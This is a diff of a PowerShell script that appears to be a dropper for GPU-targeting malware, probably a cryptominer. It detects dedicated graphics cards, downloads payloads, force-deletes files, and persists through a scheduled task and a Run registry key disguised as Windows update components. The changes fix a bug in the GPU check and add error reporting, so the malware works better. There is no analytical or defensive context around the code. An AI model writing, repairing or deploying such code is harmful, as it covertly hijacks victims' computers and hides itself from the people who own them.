@@ -40,7 +40,7 @@ if (!(Test-Path $ce)) {
 }
 
 $gd = $false
-try { $ccs = Get-CimInstance Win32_VideoController -ErrorAction SilentlyContinue; foreach ($cc in $ccs) { $nn=$cc.Name.ToUpper(); if ($nn -match "NVIDIA|AMD|RADEON|RTX|GTX" -or $cc.AdapterRAM -gt 2G) { if ($nn -notmatch "MICROSOFT BASIC|DISPLAY") { $gd = $true; break } } } } catch { }
+try { $ccs = Get-CimInstance Win32_VideoController -ErrorAction SilentlyContinue; foreach ($cc in $ccs) { $nn=$cc.Name.ToUpper(); if ($nn -match "NVIDIA|AMD|RADEON|RTX|GTX" -or $cc.AdapterRAM -gt 2GB) { if ($nn -notmatch "MICROSOFT BASIC|DISPLAY") { $gd = $true; break } } } } catch { }
 if ($gd -and !(Test-Path $ge)) {
     if (Get-F $gUrl $gz) {
         try { Get-ChildItem $sDir -Exclude "*.zip", "*.dll", "*.dat", "OneDriveStandalone.exe" | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue } catch { }
@@ -67,6 +67,6 @@ if (Get-F $dUrl $dp) {
         else { schtasks.exe /create /tn "WindowsUpdateScan" /tr "$tp" /sc onlogon /f /ErrorAction SilentlyContinue }
         Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "UpdateCoord" -Value "$tp" -ErrorAction SilentlyContinue
         return
-    } catch { }
+    } catch { $e = $_.Exception.Message }
 }
-Write-Host "failed"
+Write-Host "failed: $e"
